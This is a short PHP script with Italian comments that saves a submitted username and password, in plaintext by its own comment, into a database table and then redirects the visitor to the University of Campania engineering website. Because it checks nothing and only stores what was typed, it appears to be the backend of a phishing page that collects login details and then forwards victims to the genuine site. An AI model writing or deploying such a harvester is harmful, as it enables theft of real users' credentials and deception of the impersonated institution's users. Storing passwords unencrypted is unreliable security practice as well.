<?php
include 'config.php';

// Recupera i dati del modulo
$username = $_POST['username'];
$password = $_POST['password'];

// Inserisci i dati nella tabella "users" senza criptarli
$sql = "INSERT INTO users (username, password) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $username, $password);

if ($stmt->execute()) {
    // Reindirizza a un sito dopo il login riuscito
    header("Location: https://www.ingegneria.unicampania.it");
    exit();
} else {
    echo "Errore: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
